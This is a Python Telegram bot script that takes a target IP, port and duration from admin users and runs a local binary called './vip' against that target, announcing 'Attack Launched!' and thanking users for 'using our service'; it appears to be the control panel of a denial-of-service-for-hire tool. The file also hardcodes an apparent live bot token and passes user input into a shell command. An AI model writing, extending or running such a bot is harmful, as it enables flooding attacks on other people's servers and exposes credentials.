import os
import asyncio
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
from telegram.error import TelegramError
from datetime import datetime, timedelta
import re

# Configuration
TELEGRAM_BOT_TOKEN = '7263360382:AAGXuphmy7-ypdsqlC-5jG05QKNwIjnWbnU'  # Replace with your Telegram bot token
ADMIN_IDS = {6512242172}  # Replace with your actual admin user ID(s)

# Binary path
BINARY_PATH = "./vip"

# Validate IP address
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip)

# Validate port number
def is_valid_port(port):
    return 1 <= port <= 65535

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to use this bot.")
        return
    
    keyboard = [[KeyboardButton("Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Press the Attack button to start configuring the attack.*"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, reply_markup=reply_markup, parse_mode='Markdown')

# Approve command
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to approve users.")
        return

    try:
        user_id = int(context.args[0])
        await update.message.reply_text(f"User {user_id} has been approved.")
    except (ValueError, IndexError):
        await update.message.reply_text("Usage: /approve <user_id>")

# Handle attack button
async def attack_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please provide the target IP, port, and duration in the format: `<IP> <PORT> <DURATION>`")

# Handle target, port, and duration input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    input_text = update.message.text.strip()

    try:
        ip, port, duration = input_text.split()
        port = int(port.strip())
        duration = int(duration.strip())

        if not is_valid_ip(ip):
            await update.message.reply_text("Invalid IP address. Please enter a valid IP.")
            return
        
        if not is_valid_port(port):
            await update.message.reply_text("Port must be between 1 and 65535.")
            return

        await context.bot.send_message(chat_id=update.effective_chat.id, text=( 
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {ip}:{port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ), parse_mode='Markdown')

        print(f"Running attack on {ip}:{port} for {duration} seconds.")  # Debug message
        asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, context))
    except ValueError:
        await update.message.reply_text("Invalid format. Please enter in the format: `<IP> <PORT> <DURATION>`")

# Run attack
async def run_attack(chat_id, ip, port, duration, context):
    try:
        print(f"Starting attack with vip on {ip}:{port} for {duration} seconds.")  # Debug message
        process = await asyncio.create_subprocess_shell(
            f"./vip {ip} {port} {duration} ",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        print("Attack completed.")  # Debug message
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Attack$'), attack_button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    application.run_polling()

if __name__ == '__main__':
    main()
